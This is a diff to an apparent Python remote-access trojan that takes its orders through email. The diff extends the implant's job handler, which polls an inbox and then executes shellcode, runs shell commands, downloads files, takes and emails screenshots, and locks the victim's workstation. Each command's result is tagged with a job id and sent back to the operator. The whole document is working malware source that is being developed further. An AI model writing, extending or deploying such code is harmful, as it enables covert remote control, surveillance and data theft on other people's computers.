@@ -45,15 +45,19 @@ uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
 class msgparser:
 
     def __init__(self, msg_data):
-        self.getText(msg_data)
+        self.attachment = None
+        self.getPayloads(msg_data)
         self.getSubjectHeader(msg_data)
         self.getDateHeader(msg_data)
 
-    def getText(self, msg_data):
+    def getPayloads(self, msg_data):
         for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
             if payload.get_content_maintype() == 'text':
                 self.text = payload.get_payload()
                 self.dict = ast.literal_eval(payload.get_payload())
+
+            elif payload.get_content_maintype() == 'application':
+                self.attachment = payload.get_payload()
 
     def getSubjectHeader(self, msg_data):
         self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
@@ -73,10 +77,11 @@ def getSysinfo():
 def detectForgroundWindow():
     return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
-def lockWorkstation():
+def lockWorkstation(jobid):
     ctypes.windll.user32.LockWorkStation()
+    sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=jobid)
 
-def screenshot():
+def screenshot(jobid):
     try:
 
         screen_dir = os.getenv('TEMP')
@@ -84,7 +89,7 @@ def screenshot():
         img=ImageGrab.grab()
         saveas= os.path.join(screen_dir, genRandomString() + '.png')
         img.save(saveas)
-        SendEmail('Screenshot taken', [saveas])
+        sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=jobid, attachment=[saveas])
         os.remove(saveas)
 
     except Exception as e:
@@ -130,10 +135,12 @@ def execCmd(command, jobid):
         if verbose == True: print_exc()
         pass
 
-def sendEmail(text, jobid='', attachment=[]):
+def sendEmail(text, jobid='', attachment=[], checkin=False):
     sub_header = uniqueid
     if jobid:
-        sub_header = '{}:{}'.format(uniqueid,jobid)
+        sub_header = 'imp:{}:{}'.format(uniqueid,jobid)
+    elif checkin:
+        sub_header = 'checkin:{}'.format(uniqueid)
 
     msg = MIMEMultipart()
     msg['From'] = sub_header
@@ -187,20 +194,26 @@ def checkJobs():
                     jobid = msg.subject.split(':')[2]
                     
                     if msg.dict:
-                        cmd = msg.dict['CMD']
+                        cmd = msg.dict['CMD'].lower()
                         arg = msg.dict['ARG']
 
                         if cmd == 'execshellcode': 
-                            t = threading.Thread(name='execshell', target=execShellcode, args=(arg,))
+                            t = threading.Thread(name='execshell', target=execShellcode, args=(arg,jobid))
                         
                         elif cmd == 'download':
-                            t = threading.Thread(name='download', target=download, args=(arg,))
+                            t = threading.Thread(name='download', target=download, args=(arg,jobid))
                         
                         elif cmd == 'screenshot':
-                            t = threading.Thread(name='screenshot', target=screenshot)
+                            t = threading.Thread(name='screenshot', target=screenshot, args=(jobid,))
                         
                         elif cmd == 'cmd':
                             t = threading.Thread(name='execCmd', target=execCmd, args=(arg,jobid,))
+
+                        elif cmd == 'lockscreen':
+                            t = threading.Thread(name='lockWorkstation', target=lockWorkstation, args=(jobid,))
+
+                        elif cmd == 'forcecheckin':
+                            sendEmail("Host checking in", checkin=True)
 
                         else:
                             raise NotImplementedError
@@ -217,7 +230,7 @@ def checkJobs():
             time.sleep(10)
 
 if __name__ == '__main__':
-    sendEmail("Host checking in")
+    sendEmail("Host checking in", checkin=True)
     try:
         checkJobs()
     except KeyboardInterrupt:
